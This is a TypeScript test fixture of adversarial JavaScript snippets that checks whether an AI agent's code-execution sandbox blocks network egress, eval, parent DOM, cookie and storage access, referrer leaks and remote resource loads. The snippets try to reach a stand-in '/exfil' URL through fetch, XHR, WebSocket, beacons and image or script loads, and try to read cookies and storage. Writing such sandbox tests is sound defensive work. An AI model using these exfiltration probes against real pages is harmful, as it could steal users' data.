// Adversarial JavaScript snippets fed to the real `run_javascript` sandbox via a
// mocked LiteLLM tool call (see mock-litellm.ts). Each snippet runs INSIDE the
// sandbox Worker as an async function body, so it ends with `return <object>` to
// surface a structured outcome. That returned object becomes the tool result
// (`SandboxExecutionResult.result`), which the agent runtime folds back into the
// NEXT /api/models/chat request — where the test reads it as the in-sandbox
// oracle. Several guarantees are demonstrated by the Worker's own absence of an
// API (e.g. no `document`, no `Image`) AND by the in-document CSP; either way the
// security OUTCOME (no egress / no DOM / no eval) holds, which is what #217 asserts.

// A host that, if a request ever escaped the sandbox, the test's external network
// oracle would observe. `.invalid` is a reserved non-resolvable TLD (RFC 6761), so
// nothing can accidentally succeed even outside CSP.
export const SENTINEL_HOST = 'e2e-sandbox-sentinel.invalid'
const SENTINEL_URL = `https://${SENTINEL_HOST}/exfil`

// 1. No network egress — fetch/XHR/WebSocket/sendBeacon/EventSource must not reach
//    the network. fetch/XHR/WebSocket exist in a Worker and are blocked by CSP
//    `connect-src 'none'`; sendBeacon/EventSource are absent from Worker scope and
//    throw ReferenceError. Both are "blocked" for the purposes of the guarantee.
export const NO_EGRESS = `
  const out = {};
  const URL_ = ${JSON.stringify(SENTINEL_URL)};
  const WS_ = ${JSON.stringify('wss://' + SENTINEL_HOST + '/ws')};

  // fetch — CSP rejects the promise.
  try { await fetch(URL_); out.fetch = 'NOT_BLOCKED'; }
  catch (e) { out.fetch = 'blocked:' + ((e && e.name) || 'Error'); }

  // Synchronous XHR — CSP makes send() throw.
  try {
    const x = new XMLHttpRequest();
    x.open('GET', URL_, false);
    x.send();
    out.xhr = 'NOT_BLOCKED';
  } catch (e) { out.xhr = 'blocked:' + ((e && e.name) || 'Error'); }

  // WebSocket — blocked asynchronously: under connect-src 'none' it errors/closes
  // and never opens. "opened" is the only NOT_BLOCKED outcome.
  out.websocket = await new Promise((resolve) => {
    let settled = false;
    const fin = (v) => { if (!settled) { settled = true; resolve(v); } };
    let ws;
    try { ws = new WebSocket(WS_); } catch (e) { return fin('blocked:' + ((e && e.name) || 'Error')); }
    ws.onopen = () => fin('NOT_BLOCKED');
    ws.onerror = () => fin('blocked:error');
    ws.onclose = () => fin('blocked:closed');
    setTimeout(() => fin('blocked:never-opened'), 2000);
  });

  // sendBeacon — absent from Worker scope (no navigator.sendBeacon).
  if (typeof navigator === 'undefined' || typeof navigator.sendBeacon !== 'function') {
    out.sendBeacon = 'blocked:unavailable';
  } else {
    try { out.sendBeacon = navigator.sendBeacon(URL_, 'x') ? 'NOT_BLOCKED' : 'blocked:rejected'; }
    catch (e) { out.sendBeacon = 'blocked:' + ((e && e.name) || 'Error'); }
  }

  // EventSource — absent from Worker scope, or (if present) blocked asynchronously.
  out.eventSource = await new Promise((resolve) => {
    if (typeof EventSource === 'undefined') return resolve('blocked:unavailable');
    let settled = false;
    const fin = (v) => { if (!settled) { settled = true; try { es.close(); } catch (_) {} resolve(v); } };
    let es;
    try { es = new EventSource(URL_); } catch (e) { return resolve('blocked:' + ((e && e.name) || 'Error')); }
    es.onopen = () => fin('NOT_BLOCKED');
    es.onerror = () => fin('blocked:error');
    setTimeout(() => fin('blocked:never-opened'), 2000);
  });

  return out;
`

// 2. No eval / new Function — with no `'unsafe-eval'` in the CSP both must throw.
export const NO_EVAL = `
  const out = {};
  try { const r = eval('1 + 1'); out.eval = 'NOT_BLOCKED:' + r; }
  catch (e) { out.eval = 'blocked:' + ((e && e.name) || 'Error'); }
  try { const f = new Function('return 1 + 1'); f(); out.newFunction = 'NOT_BLOCKED'; }
  catch (e) { out.newFunction = 'blocked:' + ((e && e.name) || 'Error'); }
  return out;
`

// 3. Opaque origin — the executed code (in the Worker, inside the opaque-origin
//    iframe) must not reach parent/top DOM, storage, cookies, or the app URL.
//    `document`/`localStorage`/`sessionStorage`/`parent`/`top` are absent from
//    Worker scope; `indexedDB` exists but is unusable at an opaque origin; the
//    Worker's `location` is the blob: URL, never the app URL.
export const OPAQUE_ORIGIN = `
  const out = {};
  const probe = (name, fn) => {
    try { const v = fn(); out[name] = v === undefined ? 'unreachable' : ('VALUE:' + String(v)); }
    catch (e) { out[name] = 'threw:' + ((e && e.name) || 'Error'); }
  };
  probe('parent', () => (typeof parent !== 'undefined' ? parent.document : undefined));
  probe('top', () => (typeof top !== 'undefined' ? top.location.href : undefined));
  probe('localStorage', () => (typeof localStorage !== 'undefined' ? localStorage.length : undefined));
  probe('sessionStorage', () => (typeof sessionStorage !== 'undefined' ? sessionStorage.length : undefined));
  probe('cookie', () => (typeof document !== 'undefined' ? document.cookie : undefined));
  // indexedDB is present in workers; opening a DB at an opaque origin must fail.
  await new Promise((resolve) => {
    try {
      if (typeof indexedDB === 'undefined') { out.indexedDB = 'unreachable'; return resolve(); }
      const req = indexedDB.open('e2e-probe');
      req.onsuccess = () => { out.indexedDB = 'OPENED'; resolve(); };
      req.onerror = () => { out.indexedDB = 'threw:' + ((req.error && req.error.name) || 'Error'); resolve(); };
      req.onblocked = () => { out.indexedDB = 'blocked'; resolve(); };
    } catch (e) { out.indexedDB = 'threw:' + ((e && e.name) || 'Error'); resolve(); }
  });
  // The worker's own location must be an opaque blob: URL, never an http(s) app
  // URL — so it can never leak the embedding page's origin.
  const href = (typeof location !== 'undefined' && location.href) ? location.href : '';
  out.locationLeaksAppOrigin = /^https?:\\/\\//.test(href);
  return out;
`

// 4. No referrer leak — code runs in a Worker (no document.referrer), and the
//    sandbox iframe is created with referrerPolicy="no-referrer". The in-sandbox
//    observation: there is no document surface to read a referrer from. The
//    request-header level is covered by the network oracle (no request is ever
//    made, so no Referer is ever sent).
export const NO_REFERRER = `
  const out = {};
  out.hasDocument = (typeof document !== 'undefined');
  out.referrer = (typeof document !== 'undefined' && 'referrer' in document) ? document.referrer : 'no-document';
  return out;
`

// 5. No resource loads — img-src/media-src 'none' (and absence of Image/importScripts
//    egress) block resource-load exfiltration. `Image` is absent from Worker scope;
//    `importScripts` of a remote URL is blocked by CSP.
export const NO_RESOURCE_LOADS = `
  const out = {};
  try {
    if (typeof Image === 'undefined') { out.image = 'unavailable'; }
    else { const img = new Image(); img.src = ${JSON.stringify(SENTINEL_URL + '.png')}; out.image = 'NOT_BLOCKED'; }
  } catch (e) { out.image = 'blocked:' + ((e && e.name) || 'Error'); }
  try {
    if (typeof importScripts === 'undefined') { out.importScripts = 'unavailable'; }
    else { importScripts(${JSON.stringify(SENTINEL_URL + '.js')}); out.importScripts = 'NOT_BLOCKED'; }
  } catch (e) { out.importScripts = 'blocked:' + ((e && e.name) || 'Error'); }
  return out;
`

// 6. Worker creation works — the one capability the design depends on. A benign
//    computation proves the blob: Worker runs under `worker-src blob:` in the
//    sandboxed opaque-origin iframe.
export const WORKER_WORKS = `
  return { sum: 1 + 1, ran: true };
`

// 7. Timeout / teardown — an infinite loop must be terminated at the deadline
//    (timedOut: true) and the iframe torn down (asserted at the page level).
export const INFINITE_LOOP = `
  while (true) {}
`
